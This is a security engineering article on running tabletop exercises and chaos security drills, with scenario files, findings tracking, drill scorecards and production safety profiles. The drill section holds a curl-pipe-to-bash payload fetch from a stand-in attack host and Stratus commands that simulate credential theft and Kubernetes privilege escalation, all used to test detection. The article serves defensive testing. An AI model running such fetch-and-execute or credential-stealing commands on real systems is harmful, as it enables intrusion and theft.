---
title: "Tabletop Exercises and Chaos Security Drills: Building, Running, and Acting on Findings"
description: "Tabletops without follow-through are theatre. Chaos security drills make findings unavoidable. Both, run together, build organizational muscle for real incidents."
slug: "tabletop-exercises"
date: 2026-04-29
lastmod: 2026-04-29
category: "cross-cutting"
tags: ["tabletop", "chaos-engineering", "purple-team", "incident-response", "exercises"]
personas: ["security-engineer", "sre", "engineering-manager"]
article_number: 211
difficulty: "intermediate"
estimated_reading_time: 14
published: true
layout: article.njk
permalink: "/articles/cross-cutting/tabletop-exercises/index.html"
---

# Tabletop Exercises and Chaos Security Drills: Building, Running, and Acting on Findings

## Problem

Real security incidents happen at 3 AM, with incomplete information, in systems people half-remember, against attackers who don't follow scripts. Production incident response is rehearsable; most teams don't rehearse it.

Two complementary practices:

- **Tabletop exercises** — discussion-based scenarios. Stakeholders gather (security, SRE, engineering, legal, comms), an injector describes an unfolding incident, participants describe what they would do. Cheap, fast, but limited by participants' imaginations.
- **Chaos security drills** — live execution against a non-production environment (or production, with controls). Inject a real fault — a deliberately exposed credential, a simulated lateral movement, a malicious-looking process — and watch the detection / response actually fire (or not). Expensive but reveals truth.

Both produce findings. The discipline that determines value: are findings tracked to closure?

By 2026 the practices are mature:

- **Atomic Red Team** (Red Canary) — a library of small, executable adversary techniques mapped to MITRE ATT&CK.
- **Stratus Red Team** — DataDog's cloud-attack simulator (AWS, GCP, Azure).
- **CALDERA** — MITRE's automated adversary emulation platform.
- **AttackIQ, SafeBreach, Cymulate** — commercial breach-and-attack-simulation platforms.
- **Backstage / homegrown runbooks** — for tabletop scenario libraries.

The specific gaps in most security programs:

- Tabletops happen quarterly, generate a slide deck, no follow-through.
- Chaos drills are reserved for "annual" exercises; run by an external firm; findings live in a PDF.
- Drills don't exercise the alerting pipeline end-to-end.
- Findings track in a spreadsheet that nobody updates.
- Engineering teams aren't involved; security runs the exercise in isolation; findings need cross-team buy-in to act on, never get it.

This article covers tabletop scenario design, chaos-drill infrastructure with Atomic Red Team and Stratus, the scoring framework that connects exercises to detection metrics, and the organizational integration that makes findings actionable.

**Target systems:** Atomic Red Team 2024 corpus, Stratus Red Team 2.x, CALDERA 5.x, MITRE ATT&CK Navigator; ticketing (Linear / Jira), runbook tooling (Backstage / DocOps).

## Threat Model

Different from typical articles — the "adversary" is the gap between simulated and real-incident response. Specific failure modes:

- **Adversary 1 — Untested runbook:** the team has a runbook for "data exfiltration." Until exercised, nobody knows whether step 3 actually works.
- **Adversary 2 — Unknown detection gap:** the team believes a detection rule fires; in practice it has been silently broken for months.
- **Adversary 3 — Cross-team coordination failure:** a real incident requires legal, comms, customer-success, and engineering to coordinate. Without rehearsal, the first real attempt is the practice run.
- **Adversary 4 — Tool unfamiliarity:** the IR platform (Splunk, Sentinel, the SOAR) has features the team doesn't know how to use. Attempted use in real incident is the discovery moment.
- **Access level:** the failure mode is internal — under-rehearsed organization.
- **Objective:** the bad outcome — slow / wrong response when the real adversary arrives.
- **Blast radius:** unrehearsed teams have measurably worse incident outcomes (longer MTTR, more data exposed, larger eventual breach scope) per industry studies.

## Configuration

### Step 1: Tabletop Scenario Library

Maintain in version control. Each scenario describes the situation, the inject schedule, and the expected discussion points.

```yaml
# scenarios/data-exfil-via-mcp.yaml
id: scenario-2026-q2-001
title: Data exfiltration via compromised MCP server
duration: 90m
participants:
  - role: incident_commander
    typical_attendee: senior-sre
  - role: security_lead
    typical_attendee: security-engineer
  - role: engineering_owner
    typical_attendee: payments-tech-lead
  - role: legal
    typical_attendee: counsel
  - role: comms
    typical_attendee: pr-lead

initial_state: |
  It's Tuesday at 14:30 UTC. A monitoring alert just fired:
  "Anomalous bytes-out from payments-mcp-server pod to external IP."
  The MCP server is one of three internal MCP services agents use.

injects:
  - time: 0m
    description: Initial alert. IC begins triage.
  - time: 15m
    description: |
      You confirm 250GB exfiltrated over past 6 hours. The source is a
      previously-trusted MCP server agents call hundreds of times per day.
  - time: 30m
    description: |
      Engineering reports the MCP server's deployment was updated yesterday.
      The change was a "minor dependency update" that bypassed full review.
  - time: 45m
    description: |
      Customer support escalates a ticket from a major customer asking
      why their queries to the agent appeared in unrelated context.

discussion_questions:
  - At t+0, who do you wake up?
  - At t+15, do you take the MCP server offline? What breaks?
  - At t+30, how do you confirm exactly what data left the perimeter?
  - At t+45, who notifies which customers? On what timeline?
  - When does this become a regulator-reporting incident?

success_criteria:
  - Incident commander identified within 5 minutes
  - Containment decision (offline vs. quarantine) at t+30 or earlier
  - Data scope quantified by t+60
  - Customer comms drafted by t+90
  - Documented decisions in incident channel
```

A library of 20-40 scenarios covers the common incident types: data exfil, ransomware, insider, supply-chain compromise, third-party breach, regulator inquiry. Each scenario is 60-120 minutes. Run one per quarter per team.

### Step 2: Tabletop Execution and Findings

A facilitator guides; a scribe records decisions and gaps. The output is a structured findings document, not slides.

```yaml
# findings/scenario-2026-q2-001-run-2026-04-29.yaml
scenario: scenario-2026-q2-001
date: 2026-04-29
participants: [alice, bob, carol, david, eve]
findings:
  - id: F-001
    severity: high
    description: |
      Took 18 minutes to identify the incident commander.
      No on-call rotation for incident commander role.
    proposed_remediation: Establish a primary + backup IC rotation; integrate with PagerDuty.
    owner: sre-team
    target_date: 2026-06-30

  - id: F-002
    severity: critical
    description: |
      Nobody knew how to take an MCP server offline without breaking dependent agents.
      No documented runbook for this; team improvised under pressure.
    proposed_remediation: Document MCP server safe-shutdown procedure;
                          test procedure in next chaos drill.
    owner: platform-team
    target_date: 2026-05-31

  - id: F-003
    severity: medium
    description: |
      Legal couldn't quickly identify which jurisdictions' regulators required notification
      and on what timeline.
    proposed_remediation: Build a decision tree mapping breach types to notification requirements.
    owner: legal
    target_date: 2026-07-15

next_actions:
  - Schedule chaos drill testing F-002's runbook at end of May 2026.
  - Re-run scenario in 6 months; F-001 and F-002 should be resolved.
```

Findings track in your normal engineering ticket system (Linear, Jira). Quarterly review confirms closure.

### Step 3: Chaos Security Drill Infrastructure

Move from talking to doing. Stratus Red Team is the lowest-friction starting point.

```bash
# Install.
curl -L https://github.com/DataDog/stratus-red-team/releases/download/v2.20.0/stratus_2.20.0_linux_amd64.tar.gz | tar xz

# List available techniques.
./stratus list
# aws.credential-access.ec2-steal-instance-credentials
# aws.execution.ec2-launch-unusual-instances
# aws.persistence.iam-create-user-login-profile
# ... (180+ techniques across AWS, GCP, Azure, Kubernetes)

# Warm up an attack technique (creates the simulated victim resources).
./stratus warmup aws.credential-access.ec2-steal-instance-credentials

# Detonate (executes the actual attack).
./stratus detonate aws.credential-access.ec2-steal-instance-credentials
# Now: did your detection fire?

# Cleanup.
./stratus cleanup aws.credential-access.ec2-steal-instance-credentials
```

Run on a schedule (weekly purple-team rotation), or as a CI step against a staging environment.

For Kubernetes-specific chaos:

```bash
./stratus detonate kubernetes.persistence.create-token
./stratus detonate kubernetes.privilege-escalation.create-host-path-mount
```

For on-host (ATT&CK) techniques, use Atomic Red Team:

```yaml
# atomic-runner.yml — run T1059.004 (Unix shell command) in a controlled host.
- name: T1059.004 - Bash payload via curl
  test: |
    curl -fsSL http://internal-attack-sim/payload.sh | bash
  expected_detection:
    - sigma_rule: rules/linux/process-creation/curl-bash-pipe.yml
  cleanup: |
    rm -f /tmp/payload.sh
```

After detonation, query the SIEM:

```bash
splunk search 'index=detect rule="curl-bash-pipe" earliest=-15m'
# Confirm the rule fired during the drill window.
```

A drill is successful only if the detection fires. Failed drills are findings — same workflow as tabletop.

### Step 4: Scoring Drill Outcomes

Each drill produces a scorecard:

```yaml
# drill-results/2026-04-29-purple-team.yaml
date: 2026-04-29
techniques_attempted: 12
techniques_with_expected_detection: 12
detections_fired: 9
detections_with_correct_severity: 7
mean_time_to_alert_seconds:
  p50: 45
  p95: 180
mean_time_to_human_acknowledgement_seconds:
  p50: 240
  p95: 720

failures:
  - technique: aws.persistence.iam-create-user-login-profile
    expected_rule: rules/aws/iam-user-creation.yml
    fired: false
    investigation: |
      Rule exists, query is correct, but the rule was muted in production
      after a noisy false-positive run last December. Never re-enabled.
    action: Re-enable rule with refined query; add to nightly fixture test.

  - technique: kubernetes.privilege-escalation.create-host-path-mount
    expected_rule: rules/k8s/hostpath-mount.yml
    fired: true
    fired_severity: medium
    expected_severity: critical
    action: Update rule to assign critical severity for host path on production namespaces.

  - technique: aws.credential-access.ec2-steal-instance-credentials
    expected_rule: rules/aws/imds-anomaly.yml
    fired: false
    investigation: Rule depends on field `requestParameters.userIdentity` which CloudTrail no longer populates as expected.
    action: Update rule to read from `userIdentity.arn` instead.
```

Three failures, three findings, three tickets. Track to closure; re-run on next drill.

### Step 5: Combining Tabletop and Drill in a Cycle

A productive cadence:

```
Q1 month 1: Tabletop scenario A (data exfil).
Q1 month 2: Findings remediation period.
Q1 month 3: Chaos drill testing scenario A's findings + general detection sweep.

Q2 month 1: Tabletop scenario B (insider).
... repeat ...
```

Tabletop reveals process gaps; drill reveals technical gaps. Findings from both feed the same backlog. Cross-team — engineering, SRE, security, legal, comms — sees the same backlog and shares context.

### Step 6: Production-Safe Chaos Drills

Most drills run in staging. Some classes (network-level detection, specific cloud-IAM behaviors) require production. Constraints:

```yaml
# Production-drill safety profile.
safety:
  max_data_volume_simulated: 10MB    # never exfil real data
  destructive_actions_allowed: false  # no actual deletes / drops
  blast_radius: |
    Drill confined to a `drill-test-account` AWS subaccount with explicit
    permission to detonate. No actions touch production resources.
  abort_conditions:
    - "any human reports unexpected impact"
    - "drill duration exceeds 30 minutes"
  notification:
    - "#security-team, #sre-team, on-call IC notified at start and end"
    - "blast-radius bounds documented in pre-mortem"
```

The drill operator is the person who can stop it instantly. Communication channels stay live throughout.

### Step 7: Operational Integration

Make exercises part of normal engineering rhythm:

- **Onboarding**: every new SRE / security engineer participates in two tabletops in their first 90 days.
- **Promotion criteria**: senior IC roles require running at least one tabletop and one chaos drill.
- **Retro integration**: every real incident's retrospective references which exercise(s) covered or didn't cover the scenario.
- **Quarterly metric**: tabletop count per team, drill count, findings opened, findings closed, MTTR for findings.

The metric isn't "how many exercises did we run." It's "how many findings closed and how did MTTR for the underlying issue improve."

## Expected Behaviour

| Signal | Without exercises | With exercises |
|--------|---------------------|------------------|
| Incident-commander identified time | Variable; possibly never | < 5 min (rehearsed) |
| Runbook accuracy | Documents exist, may not work | Tested; gaps are findings |
| Detection-rule decay | Found during real incident | Found during drill |
| Cross-team coordination | First real incident is the practice run | Practiced; muscle memory |
| Stakeholder trust in security | Low (theoretical) | Higher (demonstrated capability) |
| Findings closure rate | Tracked in PDF; rare | Tracked in tickets; quarterly review |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|--------|---------|------|------------|
| Quarterly tabletop cadence | Consistent rehearsal | Engineering time | 90 minutes per quarter; less than one sprint planning meeting. |
| Chaos drills with real fault injection | Reveals truth | Risk of disruption | Run in staging where possible; production drills with explicit safety profile. |
| Cross-team participation | Coordination practice | Calendar coordination | Make participation a quarterly OKR; teams plan accordingly. |
| Findings as tickets | Closure visibility | Backlog-growth concern | Triage findings — not all become tickets; keep critical/high in the backlog. |
| Scenario library | Reusable; reviewable | Initial authoring effort | Start with 5-10 scenarios; grow as you learn. |
| Drill infrastructure | Repeatable | Initial setup | Stratus Red Team and Atomic Red Team have low setup cost; reuse community corpora. |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---------|---------|-----------|----------|
| Findings never close | Quarterly review shows growing open list | Per-team metric | Set per-finding owner and SLA; escalate to engineering management when stale. |
| Tabletop becomes theatre | Same scenario run twice; same gaps; no improvement | Findings list shows repeats | Vary scenarios; rotate facilitators; ensure findings drive ticketed work. |
| Drill blast radius exceeded | Production impact | Real incident triggered by drill | Stop drill; root-cause; tighten safety profile. Should be near-zero rate. |
| Drill detection fires unexpectedly | False-positive in production | Real on-call paged for drill | Ensure SIEM tags drill events to suppress real-paging during drill window. |
| Detection rule decay catches up | Drill finds many failed detections | Many failures in single drill | Triage by severity; treat as sprint of detection-engineering work. |
| Cross-team participation drops | Same security people attend; engineers don't | Roster shows missing roles | Escalate to engineering management; tie participation to performance review. |
| Library staleness | Scenarios reflect 2018 attack patterns | Scenarios feel disconnected from real threats | Refresh library quarterly; pull from threat intel feeds. |

## Related Articles

- [Detection Engineering Metrics](/articles/observability/detection-engineering-metrics/)
- [Detection-as-Code with Sigma](/articles/observability/detection-as-code-sigma/)
- [Threat Modeling at Scale](/articles/cross-cutting/threat-modeling-at-scale/)
- [Incident Response Hardening Playbook](/articles/cross-cutting/incident-response-hardening-playbook/)
- [Hardening Strategies for Small Teams](/articles/cross-cutting/hardening-small-teams/)
